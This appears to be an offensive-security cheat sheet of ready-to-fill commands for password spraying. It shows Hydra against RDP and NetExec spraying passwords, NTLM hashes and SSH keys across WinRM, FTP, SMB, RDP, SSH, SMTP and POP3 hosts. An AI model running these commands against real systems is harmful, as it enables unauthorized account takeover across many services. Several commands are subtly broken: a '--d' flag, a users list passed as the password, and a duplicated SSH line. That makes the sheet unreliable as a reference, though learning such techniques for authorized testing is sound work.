### **Spray Credentials**

### **Hydra**

```bash
# Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
hydra -L [USERS_LIST].txt -p "[PASSWORD]" rdp://<target_ip>

```

### **NetExec**

```bash
# WinRM password spraying
netexec winrm [TARGETS_LIST].txt -u [USERS_LIST].txt -H [HASH_LIST].txt

# FTP password spraying
netexec ftp [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSWORDS_LIST].txt -d <domain> --continue-on-success

# SMB password spraying
netexec smb [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSWORDS_LIST].txt -d <domain> --continue-on-success

# RDP password spraying
netexec rdp [TARGETS_LIST].txt -u [USERS_LIST].txt -p "[USERS_LIST].txt" --continue-on-success

# SSH password spraying
netexec ssh [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSWORDS_LIST].txt --d <domain> --continue-on-success

# SSH Domain Users: add the @[domain].com to the list manually as the tool will not do it, for example instead of the list containing "emma", make sure it contains "emma@domain.com"
netexec ssh [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSWORDS_LIST].txt --d <domain> --continue-on-success

# SSH Private Keys
netexec ssh [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSPHRASE_IF_EXISTS_OTHERWISE_LEAVE_EMPTY] --key-file [PRIVATE_KEY_FILE]

# Multiple targets with WinRM
netexec winrm [TARGETS_LIST].txt -u [USERS_LIST].txt -H [HASH_LIST].txt -d [DOMAIN].com --continue-on-success

# SMTP password spraying
netexec smtp [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSWORDS_LIST].txt --continue-on-success

# POP3 password spraying
netexec pop3 [TARGETS_LIST].txt -u [USERS_LIST].txt -p [PASSWORDS_LIST].txt --continue-on-success
```
